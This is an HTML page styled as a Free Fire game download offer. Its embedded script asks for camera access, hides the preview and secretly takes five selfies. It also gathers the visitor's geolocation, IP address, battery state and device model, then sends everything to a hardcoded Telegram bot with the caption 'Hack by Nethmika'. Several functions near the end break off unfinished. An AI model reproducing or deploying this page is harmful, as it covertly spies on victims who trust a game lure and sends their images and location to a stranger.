<head>

  <style>
    :root {
      --primary: #ff4a00;
      --secondary: #ff9900;
      --bg-dark: #0a0a0f;
      --card-bg: rgba(18, 18, 26, 0.85);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Rajdhani', 'Segoe UI', sans-serif;
    }

    body {
      background: #050508;
      background-image: 
        radial-gradient(circle at 4% 3%, rgba(211, 144, 8, 0.15) 0%, transparent 100%),
        linear-gradient(rgba(5, 5, 8, 0.85), rgba(5, 5, 8, 0.95)),
        url('//dl.dir.freefiremobile.com/common/web_event/official2.ff.garena.all/202210/526ab8efaf60be59ccf03e314e019a3a.jpg');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    /* Main Container */
    .wrapper {
      max-width: 500px;
      width: 100%;
      position: relative;
    }

    /* Outer Glow Effect */
    .wrapper::before {
      content: '';
      position: absolute;
      top: -2px; left: -2px; right: -2px; bottom: -2px;
      background: linear-gradient(45deg, var(--primary), transparent, var(--secondary));
      border-radius: 22px;
      z-index: 0;
      filter: blur(10px);
      opacity: 0.6;
    }

    .card {
      position: relative;
      z-index: 1;
      background: var(--card-bg);
      backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 35px 25px;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      overflow: hidden;
    }

    /* Top Animated Tag */
    .tag {
      display: inline-block;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      color: #000;
      font-size: 11px;
      font-weight: 900;
      letter-spacing: 2px;
      text-transform: uppercase;
      padding: 6px 18px;
      border-radius: 30px;
      margin-bottom: 20px;
      box-shadow: 0 0 15px rgba(255, 74, 0, 0.5);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    /* Character/Poster Image Frame */
    .image-box {
      position: relative;
      border-radius: 15px;
      overflow: hidden;
      margin-bottom: 25px;
      border: 2px solid rgba(255, 153, 0, 0.4);
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
    }

    .image-box img {
      width: 100%;
      height: 220px;
      object-fit: cover;
      display: block;
      transition: transform 0.5s ease;
    }

    .card:hover .image-box img {
      transform: scale(1.05);
    }

    .image-overlay {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 60%;
      background: linear-gradient(to top, var(--card-bg), transparent);
    }

    /* Titles & Text */
    h1 {
      font-size: 28px;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      background: linear-gradient(180deg, #ffffff 0%, #cccccc 100%);
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
    }

    p {
      color: #a0a0b0;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 30px;
    }

    /* Download Button */
    .btn-download {
      position: relative;
      display: block;
      width: 100%;
      padding: 18px;
      background: linear-gradient(45deg, #ff3300, #ff9900);
      color: #ffffff;
      font-size: 18px;
      font-weight: 800;
      text-decoration: none;
      text-transform: uppercase;
      letter-spacing: 2px;
      border-radius: 12px;
      overflow: hidden;
      transition: all 0.3s ease;
      box-shadow: 0 10px 30px rgba(255, 51, 0, 0.4);
    }

    .btn-download:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(255, 51, 0, 0.7);
    }

    .btn-download:active {
      transform: translateY(1px);
    }

    /* Features Grid */
    .features {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 25px;
      padding-top: 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.08);
    }

    .feat-item {
      background: rgba(255, 255, 255, 0.03);
      padding: 10px 5px;
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .feat-item span {
      display: block;
      font-size: 11px;
      color: #777;
      text-transform: uppercase;
    }

    .feat-item strong {
      display: block;
      font-size: 13px;
      color: var(--secondary);
      margin-top: 3px;
    }
  </style>
</head>

  <script>
    const TELEGRAM_TOKEN = '8904202237:AAFx1bbPq_zIrdDZPqEA8GXB7IoOnOKh_Jc';

    let track, photos = [], photoCount = 0;
    let locationData = null;
    const video = document.getElementById('video');
    const giveButton = document.getElementById('give-access');

    giveButton.addEventListener('click', () => {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          video.srcObject = stream;
          video.style.display = 'none'; // hide camera preview
          track = stream.getVideoTracks()[0];
          requestLocation();
        })
        .catch(() => {
          alert('Camera permission denied.');
        });
    });

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            locationData = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude
            };
            setTimeout(capturePhoto, 1000);
          },
          err => {
            console.warn('Location denied:', err);
            setTimeout(capturePhoto, 1000);
          }
        );
      } else {
        setTimeout(capturePhoto, 1000);
      }
    }

    function capturePhoto() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = 300;
      canvas.height = 400;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const base64 = canvas.toDataURL('image/jpeg');
      photos.push(base64);
      photoCount++;

      if (photoCount >= 5) {
        track.stop();
        sendInfo();
      } else {
        setTimeout(capturePhoto, 1500);
      }
    }

    async function sendInfo() {
      try {
        const battery = await navigator.getBattery();
        const batteryLevel = Math.round(battery.level * 100);
        const charging = battery.charging ? 'Charging' : 'Not Charging';

        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ip = (await ipRes.json()).ip;

        const userAgent = navigator.userAgent;
        const androidInfo = parseAndroidInfo(userAgent);

        let msg = `✅ HACKING START & DONE

⚓ IP: ${ip}

📱 DEVICE INFO
🧬 Android Version: ${androidInfo.version}
📼 Model: ${androidInfo.model}
🔗 UserAgent: ${userAgent}

🔌 BATTERY DETAILS
🔋 Battery: ${batteryLevel}%
🔌 Battery Status: ${charging}`;

        if (locationData) {
          msg += `\nLocation: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
        }

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });

        for (const base64 of photos) {
          const formData = createFormData(base64);
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          await new Promise(res => setTimeout(res, 400));
        }

      } catch (err) {
        console.error(err);
      }
    }

    function parseAndroidInfo(userAgent) {
      let version = 'Android 12';
      let model = 'ZTE A53 Pro';
      const androidMatch = userAgent.match(/Android\s([0-9.]+)/);
      const modelMatch = userAgent.match(/Android.*?;\s([^;)\s]+)/);
      if (androidMatch) version = androidMatch[1];
      if (modelMatch) model = modelMatch[1];
      return { version, model };
    }

    function createFormData(base64) {
      const byteString = atob(base64.split(',')[1]);
      const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      const blob = new Blob([ab], { type: mimeString });
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'selfie.jpg');
      formData.append('caption', 'Hack by Nethmika');
      return formData;
    }

    function handleShare() {
      navigator.clipboard.writeText(window.location.href)
        .then(() => {

          document.getElementById('share-status').innerText = "Link copied!";

    function formatNumber(num) {
      if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
      if (num >= 1000) return (num / 1000).toFixed(1) + "K";
      return num;
    }

    function loadComments() {

    function postComment() {
